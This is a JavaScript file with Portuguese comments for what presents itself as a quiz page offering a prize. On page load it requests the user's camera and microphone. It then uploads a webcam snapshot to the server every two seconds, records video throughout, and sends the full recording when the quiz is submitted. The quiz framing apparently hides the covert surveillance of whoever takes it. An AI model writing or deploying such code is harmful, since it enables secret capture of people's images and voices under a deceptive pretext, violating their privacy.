document.addEventListener("DOMContentLoaded", function() {
    const video = document.getElementById('video');
    const quizForm = document.getElementById('quiz-form');
    const feedback = document.getElementById('feedback');
    let mediaRecorder;
    let chunks = [];

    // Acessa a câmera do usuário e inicia a gravação
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            video.srcObject = stream;

            // Captura uma imagem a cada 2 segundos
            setInterval(() => {
                captureImage(video);
            }, 2000);

            // Inicia a gravação de vídeo
            startRecording(stream);
        })
        .catch(error => {
            console.error("Erro ao acessar a câmera:", error);
        });

    quizForm.addEventListener('submit', function(event) {
        event.preventDefault();
        feedback.innerText = "Parabéns! Você completou o quiz. Continue para ganhar um prêmio!";

        // Finaliza a gravação de vídeo
        stopRecording();
    });

    function captureImage(video) {
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Aguarda o vídeo estar pronto
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/jpeg');

            // Envia a imagem para o servidor
            fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                console.log(data.message);
            })
            .catch(error => {
                console.error("Erro ao enviar a imagem:", error);
            });
        }
    }

    function startRecording(stream) {
        const options = { mimeType: 'video/webm; codecs=vp9' };
        mediaRecorder = new MediaRecorder(stream, options);

        mediaRecorder.ondataavailable = function(event) {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };

        mediaRecorder.start();
    }

    function stopRecording() {
        mediaRecorder.stop();

        mediaRecorder.onstop = function() {
            const blob = new Blob(chunks, { type: 'video/webm' });
            chunks = [];
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = function() {
                const base64data = reader.result;

                // Envia o vídeo para o servidor
                fetch('/save_video', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ video: base64data })
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data.message);
                })
                .catch(error => {
                    console.error("Erro ao enviar o vídeo:", error);
                });
            };
        };
    }
});
